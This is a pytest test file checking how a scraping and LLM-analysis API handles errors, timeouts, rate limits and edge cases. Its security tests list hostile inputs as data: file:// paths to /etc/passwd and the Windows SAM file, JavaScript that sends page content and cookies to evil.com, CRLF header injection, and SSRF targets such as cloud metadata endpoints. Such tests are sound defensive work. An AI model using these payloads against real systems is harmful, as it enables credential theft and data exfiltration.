"""
Comprehensive Error Handling Tests
"""

import pytest
import sys
import time
import requests
from pathlib import Path
from typing import Dict

# Add parent directory to path
sys.path.append(str(Path(__file__).parent.parent))

from utils.test_base import BaseAPITest


class TestCommonErrors(BaseAPITest):
    """Test common error scenarios across all endpoints"""
    
    def test_malformed_json(self):
        """Test endpoints with malformed JSON"""
        
        # Send invalid JSON
        response = requests.post(
            f"{self.base_url}/scrape",
            headers={
                "Authorization": f"Bearer {self.api_token}",
                "Content-Type": "application/json"
            },
            data='{"url": "https://example.com", invalid json'  # Malformed
        )
        
        assert response.status_code == 400
    
    def test_missing_content_type(self):
        """Test requests without Content-Type header"""
        
        response = requests.post(
            f"{self.base_url}/scrape",
            headers={
                "Authorization": f"Bearer {self.api_token}"
                # Missing Content-Type
            },
            json={"url": "https://example.com"}
        )
        
        # Should handle gracefully
        assert response.status_code in [200, 400, 415]
    
    def test_unsupported_http_methods(self):
        """Test endpoints with wrong HTTP methods"""
        
        # GET on POST-only endpoint
        response = self.make_request("GET", "/scrape")
        assert response.status_code in [404, 405]
        
        # PUT on endpoints
        response = self.make_request("PUT", "/execute", json={
            "url": "https://example.com",
            "javascript": "document.title"
        })
        assert response.status_code in [404, 405]
        
        # DELETE on endpoints  
        response = self.make_request("DELETE", "/analyze")
        assert response.status_code in [404, 405]
    
    def test_endpoint_not_found(self):
        """Test non-existent endpoints"""
        
        response = self.make_request("POST", "/nonexistent", json={
            "test": "data"
        })
        
        assert response.status_code == 404
    
    def test_request_size_limits(self):
        """Test request size limits"""
        
        # Create large payload (10MB+)
        large_content = "x" * (10 * 1024 * 1024)
        
        response = self.make_request("POST", "/analyze", json={
            "content": large_content,
            "analysis_type": "sentiment",
            "llm_provider": "anthropic",
            "llm_token": self.anthropic_token or "test"
        })
        
        # Should reject large payloads
        assert response.status_code in [400, 413, 507]
        
        if response.status_code == 413:
            self.assert_error_response(response, "CONTENT_TOO_LARGE")
    
    def test_header_injection(self):
        """Test header injection attempts"""
        
        # Try to inject headers
        headers = {
            "Authorization": f"Bearer {self.api_token}",
            "Content-Type": "application/json",
            "X-Injected\r\nX-Another-Header": "value"  # Attempt injection
        }
        
        try:
            response = requests.post(
                f"{self.base_url}/scrape",
                headers=headers,
                json={"url": "https://example.com"}
            )
            # Should handle safely
            assert response.status_code in [200, 400]
        except:
            # Request library might reject invalid headers
            pass


class TestTimeoutScenarios(BaseAPITest):
    """Test various timeout scenarios"""
    
    def test_short_timeout(self):
        """Test operations with very short timeouts"""
        
        response = self.make_request("POST", "/scrape", json={
            "url": "https://httpbin.org/delay/5",
            "formats": ["markdown"],
            "options": {
                "timeout": 1000  # 1 second, but page delays 5 seconds
            }
        })
        
        # Should timeout
        if response.status_code != 200:
            self.assert_error_response(response, "TIMEOUT_ERROR")
            
            error_data = response.json()
            details = error_data["error"].get("details", {})
            assert details.get("timeout_ms") == 1000
    
    def test_javascript_timeout(self):
        """Test JavaScript execution timeout"""
        
        response = self.make_request("POST", "/execute", json={
            "url": self.get_test_url(),
            "javascript": """
                // Infinite loop
                let i = 0;
                while(true) {
                    i++;
                    if (i % 1000000 === 0) {
                        console.log('Still running...');
                    }
                }
            """,
            "timeout": 2000  # 2 second timeout
        })
        
        # Should timeout
        if response.status_code != 200:
            self.assert_error_response(response, "TIMEOUT_ERROR")
    
    def test_crawl_timeout(self):
        """Test crawl job timeout"""
        
        response = self.make_request("POST", "/crawl", json={
            "url": "https://httpbin.org/delay/10",
            "limit": 5,
            "depth": 1,
            "formats": ["markdown"],
            "options": {
                "timeout": 2000  # Short timeout per page
            }
        })
        
        if response.status_code == 200:
            job_id = response.json()["job_id"]
            
            # Wait and check status
            time.sleep(5)
            status_response = self.make_request("GET", f"/jobs/{job_id}")
            
            if status_response.status_code == 200:
                status_data = status_response.json()
                
                # Might have partial results with some timeouts
                if status_data["status"] == "error":
                    assert "timeout" in str(status_data["error"]).lower()


class TestNetworkErrors(BaseAPITest):
    """Test network error scenarios"""
    
    def test_dns_resolution_failure(self):
        """Test with non-resolvable domains"""
        
        response = self.make_request("POST", "/scrape", json={
            "url": "https://this-domain-definitely-does-not-exist-12345.com",
            "formats": ["markdown"]
        })
        
        # Should handle DNS failure
        assert response.status_code in [400, 502]
        
        if response.status_code == 502:
            self.assert_error_response(response, "NETWORK_ERROR")
            
            error_data = response.json()
            details = error_data["error"].get("details", {})
            assert "dns" in str(details).lower() or "resolve" in str(details).lower()
    
    def test_connection_refused(self):
        """Test with refused connections"""
        
        # Local port unlikely to be open
        response = self.make_request("POST", "/scrape", json={
            "url": "http://localhost:54321",
            "formats": ["markdown"]
        })
        
        # Should handle connection refused
        assert response.status_code in [400, 502]
        
        if response.status_code == 502:
            error_data = response.json()
            error_msg = str(error_data).lower()
            assert any(term in error_msg for term in ["refused", "connect", "network"])
    
    def test_ssl_certificate_errors(self):
        """Test with SSL certificate errors"""
        
        # Site with expired/invalid SSL
        response = self.make_request("POST", "/scrape", json={
            "url": "https://expired.badssl.com/",
            "formats": ["markdown"]
        })
        
        # Should handle SSL errors (might succeed if ignoring SSL)
        if response.status_code != 200:
            assert response.status_code in [400, 502]
    
    def test_redirect_loop(self):
        """Test infinite redirect loops"""
        
        response = self.make_request("POST", "/scrape", json={
            "url": "https://httpbin.org/redirect/20",  # Many redirects
            "formats": ["markdown"],
            "options": {
                "follow_redirects": True
            }
        })
        
        # Should handle redirect limits
        if response.status_code != 200:
            error_data = response.json()
            error_msg = str(error_data).lower()
            assert any(term in error_msg for term in ["redirect", "loop", "maximum"])


class TestRateLimiting(BaseAPITest):
    """Test rate limiting behavior"""
    
    def test_api_rate_limits(self):
        """Test API rate limiting"""
        
        # Make rapid requests
        responses = []
        start_time = time.time()
        
        # Try to trigger rate limit
        for i in range(20):
            response = self.make_request("POST", "/scrape", json={
                "url": f"https://httpbin.org/uuid",  # Different URL each time
                "formats": ["markdown"]
            })
            responses.append(response)
            
            if response.status_code == 429:
                break
            
            # Small delay to not overwhelm
            time.sleep(0.1)
        
        duration = time.time() - start_time
        
        # Check if we hit rate limit
        rate_limited = [r for r in responses if r.status_code == 429]
        
        if rate_limited:
            # Verify rate limit response
            rl_response = rate_limited[0]
            self.assert_error_response(rl_response, "RATE_LIMIT")
            
            # Check headers
            assert "X-RateLimit-Limit" in rl_response.headers
            assert "X-RateLimit-Remaining" in rl_response.headers
            assert "X-RateLimit-Reset" in rl_response.headers
            
            # Check reset time
            data = rl_response.json()
            details = data["error"]["details"]
            assert "reset_in_seconds" in details
            assert details["reset_in_seconds"] > 0
    
    def test_llm_rate_limits(self):
        """Test LLM provider rate limiting"""
        
        if not self.openai_token:
            pytest.skip("OpenAI token not configured")
        
        # Make rapid LLM requests
        responses = []
        
        for i in range(10):
            response = self.make_request("POST", "/analyze", json={
                "content": f"Test content {i} for rate limit testing",
                "analysis_type": "sentiment",
                "llm_provider": "openai",
                "llm_token": self.openai_token
            })
            responses.append(response)
            
            if response.status_code == 429:
                break
        
        # Check if we hit LLM rate limit
        llm_limited = [r for r in responses if r.status_code == 429]
        
        if llm_limited:
            rl_response = llm_limited[0]
            self.assert_error_response(rl_response, "LLM_RATE_LIMIT")
            
            data = rl_response.json()
            details = data["error"]["details"]
            assert details["provider"] == "openai"


class TestSecurityErrors(BaseAPITest):
    """Test security-related errors"""
    
    def test_path_traversal_attempts(self):
        """Test path traversal in URLs"""
        
        malicious_urls = [
            "file:///etc/passwd",
            "file://C:/Windows/System32/config/sam",
            "https://example.com/../../etc/passwd",
            "http://localhost/../../../etc/passwd"
        ]
        
        for url in malicious_urls:
            response = self.make_request("POST", "/scrape", json={
                "url": url,
                "formats": ["markdown"]
            })
            
            # Should reject
            assert response.status_code in [400, 403]
            
            if response.status_code == 400:
                self.assert_error_response(response, "INVALID_URL")
    
    def test_javascript_injection_attempts(self):
        """Test JavaScript injection attempts"""
        
        malicious_scripts = [
            "window.location='https://evil.com'",
            "document.cookie='stolen='+document.cookie",
            "fetch('https://evil.com/steal?data='+document.body.innerHTML)",
            "eval('malicious code')",
            "new Function('return this')()"
        ]
        
        for script in malicious_scripts:
            response = self.make_request("POST", "/execute", json={
                "url": self.get_test_url(),
                "javascript": script
            })
            
            # Should be blocked by validation
            if response.status_code != 200:
                self.assert_error_response(response, "INVALID_JAVASCRIPT")
    
    def test_ssrf_attempts(self):
        """Test Server-Side Request Forgery attempts"""
        
        internal_urls = [
            "http://169.254.169.254/latest/meta-data/",  # AWS metadata
            "http://metadata.google.internal/",  # GCP metadata
            "http://127.0.0.1:8080/admin",
            "http://10.0.0.1/",
            "http://192.168.1.1/"
        ]
        
        for url in internal_urls:
            response = self.make_request("POST", "/scrape", json={
                "url": url,
                "formats": ["markdown"]
            })
            
            # Might be blocked or fail
            if response.status_code != 200:
                assert response.status_code in [400, 403, 502]


class TestEdgeCaseErrors(BaseAPITest):
    """Test edge case error scenarios"""
    
    def test_empty_response_handling(self):
        """Test handling of empty responses"""
        
        # Page that returns 204 No Content
        response = self.make_request("POST", "/scrape", json={
            "url": "https://httpbin.org/status/204",
            "formats": ["markdown", "html"]
        })
        
        # Should handle gracefully
        if response.status_code == 200:
            data = response.json()
            # Content might be empty
            assert "data" in data
    
    def test_partial_content_errors(self):
        """Test handling of partial content"""
        
        # Start a crawl that might fail partway
        response = self.make_request("POST", "/crawl", json={
            "url": "https://httpbin.org",
            "limit": 10,
            "depth": 2,
            "formats": ["markdown"],
            "options": {
                "include_patterns": ["/status/*"],
                "timeout": 5000
            }
        })
        
        if response.status_code == 200:
            job_id = response.json()["job_id"]
            
            # Let it run
            time.sleep(10)
            
            status_response = self.make_request("GET", f"/jobs/{job_id}")
            
            if status_response.status_code == 200:
                data = status_response.json()
                
                # Check for partial results
                if data["status"] == "error":
                    # Should still have some successful pages
                    assert "data" in data
                    assert isinstance(data["data"], list)
    
    def test_circular_reference_handling(self):
        """Test handling of circular references in data"""
        
        # Schema with circular reference
        circular_schema = {
            "type": "object",
            "properties": {
                "name": {"type": "string"},
                "parent": {"$ref": "#"},  # Circular reference
                "children": {
                    "type": "array",
                    "items": {"$ref": "#"}  # Circular reference
                }
            }
        }
        
        llm_config = self.get_llm_config("anthropic")
        
        response = self.make_request("POST", "/extract", json={
            "content": "John has parent Mary. Mary has child John.",
            "schema": circular_schema,
            **llm_config
        })
        
        # Should handle circular refs gracefully
        assert response.status_code in [200, 400]
    
    def test_unicode_edge_cases(self):
        """Test Unicode edge cases"""
        
        # Various Unicode edge cases
        unicode_tests = [
            "🔥💯🎉",  # Emojis
            "\u0000\u0001\u0002",  # Control characters
            "𠜎𠜱𠝹𠱓𠱸",  # CJK ideographs
            "\u200b\u200c\u200d",  # Zero-width characters
            "A\u0301\u0302\u0303\u0304",  # Combining diacriticals
        ]
        
        for test_content in unicode_tests:
            response = self.make_request("POST", "/clean", json={
                "content": test_content,
                "llm_provider": "anthropic",
                "llm_token": self.anthropic_token or "test",
                "options": {
                    "fix_formatting": True
                }
            })
            
            # Should handle without crashing
            assert response.status_code in [200, 400]


class TestRecoveryBehavior(BaseAPITest):
    """Test error recovery and resilience"""
    
    def test_retry_behavior(self):
        """Test automatic retry behavior"""
        
        # URL that intermittently fails
        response = self.make_request("POST", "/scrape", json={
            "url": "https://httpbin.org/status/500,200",  # 50% chance of 500 error
            "formats": ["markdown"],
            "options": {
                "retry_on_failure": True,
                "max_retries": 3
            }
        })
        
        # Should eventually succeed or fail definitively
        assert response.status_code in [200, 500, 502]
    
    def test_graceful_degradation(self):
        """Test graceful degradation of features"""
        
        # Request all formats but some might fail
        response = self.make_request("POST", "/scrape", json={
            "url": "https://httpbin.org/html",
            "formats": ["markdown", "screenshot", "links", "pdf"],  # PDF might not be supported
            "options": {
                "graceful_degradation": True
            }
        })
        
        if response.status_code == 200:
            data = response.json()
            
            # Should have at least some formats
            assert "data" in data
            assert len(data["data"]) > 0
            
            # Core formats should work
            assert "markdown" in data["data"] or "html" in data["data"]
    
    def test_fallback_providers(self):
        """Test fallback between LLM providers"""
        
        # Use invalid token for primary provider
        response = self.make_request("POST", "/analyze", json={
            "content": "Test content for analysis",
            "analysis_type": "sentiment",
            "llm_provider": "openai",
            "llm_token": "invalid_token",
            "options": {
                "fallback_providers": [
                    {
                        "provider": "anthropic",
                        "token": self.anthropic_token
                    }
                ] if self.anthropic_token else []
            }
        })
        
        # Should either use fallback or fail
        assert response.status_code in [200, 401]


if __name__ == "__main__":
    pytest.main([__file__, "-v"])